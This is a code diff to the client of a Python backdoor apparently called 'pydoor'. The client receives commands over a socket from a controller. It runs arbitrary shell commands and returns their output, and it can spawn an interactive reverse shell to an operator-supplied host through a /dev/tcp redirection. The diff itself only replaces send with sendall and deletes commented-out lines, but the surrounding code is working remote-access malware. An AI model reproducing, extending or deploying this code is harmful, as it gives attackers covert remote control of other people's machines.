@@ -55,7 +55,7 @@ class Client:
             if self.args[0] == "shell":
                 subprocess.run([self.shell + f" -i >& /dev/tcp/{self.args[1]}/{self.args[2]} 0>&1"], shell=True)
             elif self.args[0] == "quit":
-                self.sock.send(b"pydoor.quit")
+                self.sock.sendall(b"pydoor.quit")
                 sys.exit(0)
             elif self.args[0] == "sleep":
                 self.sleep()
@@ -63,19 +63,16 @@ class Client:
                 
                 if self.checkinstall(self.args[1]):
                     self.shell = self.args[1]
-                    self.sock.send(b"Shell successfully changed to" + self.shell.encode())
+                    self.sock.sendall(b"Shell successfully changed to" + self.shell.encode())
                 else:
-                    self.sock.send(self.args[1].encode() + b" Doesn't seem to be installed, Exiting.")
+                    self.sock.sendall(self.args[1].encode() + b" Doesn't seem to be installed, Exiting.")
                 
 
             
             else:
-                #j = subprocess.getoutput(self.shell + " -c '" + self.cmd + "'") #Pretty much every shell uses -c to run lone commands.
-
                 j = subprocess.Popen(self.cmd, shell=True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE, executable=self.shell)
-                #out = j.stdout.read() + j.stderr.read()
                 out = j.communicate()
-                self.sock.send(out[0])
+                self.sock.sendall(out[0])
 
     def start(self):
         
